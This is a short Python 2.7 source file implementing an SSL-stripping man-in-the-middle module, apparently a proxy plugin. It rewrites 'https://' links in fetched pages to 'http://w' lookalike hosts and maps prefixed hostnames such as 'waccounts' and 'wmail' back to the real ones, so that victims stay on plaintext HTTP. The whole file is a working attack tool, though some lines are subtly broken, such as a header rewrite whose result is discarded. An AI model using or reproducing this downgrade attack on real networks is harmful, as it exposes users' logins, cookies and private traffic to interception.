#!/usr/bin/env python2.7

import urllib2
import ssl

class SSLStrip:
    def request_handler(self, req, socket):
        if req.path[0] == '/':
            if isinstance(socket, ssl.SSLSocket):
                req.path = "https://%s%s" % (req.headers['Host'], req.path)
            else:
                req.path = "http://%s%s" % (req.headers['Host'], req.path)
        if req.headers:
            prefixes = ["wwww","waccounts","wmail","wbooks","wssl","wdrive","wmaps","wnews","wplay","wplus","wencrypted","wassets","wgraph","wfonts","wlogin","wsecure","wwiki","wwallet","wmyaccount","wphotos","wdocs","wlh3","wapis","wb","ws","wbr","wna","wads","wlogin","wwm","wm","wmobile","wsb"]
            for p in prefixes:
                for h in req.headers:
                    if p in req.headers[h]:
                        req.headers[h] = req.headers[h].replace(p, p[1:])

    def response_handler(self, req, res, res_body, url, path):
        if res.headers:
            for h in res.headers:
                if "https://" in res.headers[h]:
                    res.headers[h].replace("https://","http://w")
        if res_body:
            if url.scheme == "http":
                print("  not changing (http)")
                return res_body
            else:
                try:
                    hds = {}
                    hds['User-Agent'] = req.headers['User-Agent']
                    hds['Accept'] = req.headers['Accept']
                    print("    https request to: {}://{}{}".format(url.scheme, url.netloc, path))
                    original_request = urllib2.Request("{}://{}{}".format(url.scheme, url.netloc, path), headers=hds)

                    original_body = urllib2.urlopen(original_request).read()
                    res_body = original_body.replace("https://","http://w")
                except Exception as e:
                    print ('Exception SSLSTRUP---> {}'.format(e))
                    res_body = res_body.replace('https://', 'http://w')
            return res_body